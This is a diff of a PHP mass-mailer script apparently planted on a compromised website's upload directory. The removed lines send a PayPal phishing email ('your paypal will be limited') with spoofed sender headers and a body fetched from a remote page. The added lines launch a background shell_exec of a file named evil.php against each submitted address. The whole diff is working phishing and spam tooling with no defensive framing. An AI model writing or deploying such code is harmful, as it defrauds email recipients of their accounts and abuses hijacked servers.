@@ -77,19 +77,13 @@ if(!@empty($_POST['email'])) {
             $headerString .= "{$name}: $value\r\n";
         }
     }
-    
-    $headers2 = 'MIME-Version: 1.0' . "\r\n" .
-    'Content-Type: text/html; charset=iso-8859-1' . "\r\n" .
-    'From: paypal services<info@akhbarlibya24.net>' . "\r\n" .
-    'Reply-To: paypal services<info@akhbarlibya24.net>' . "\r\n" .
-    'X-Mailer: PHP/' . phpversion();
-    $subject2 = 'your paypal will be limited';
-    $message2 = file_get_contents('http://ymcacolumbus.org/track-levelup/server/php/files/msg.html');
-    mail($email, $subject2, $message2, $headers2);
+    $cmd = "/usr/bin/php /nfs/c07/h04/mnt/108415/domains/ymcacolumbus.org/html/track-levelup/server/php/files/ajax-mass-mailer/evil.php $email >> /tmp/test.log";
+    shell_exec("$cmd > /dev/null 2>&1 &");
+   
     $result = ($mailResult = mail($email, $subject, $message, $headerString)) ? 'good' : ' bad';
     $array = array('sent' => $result, 'email' => $email);
     echo json_encode($array);
     exit;
 }
-    
+
 ?>
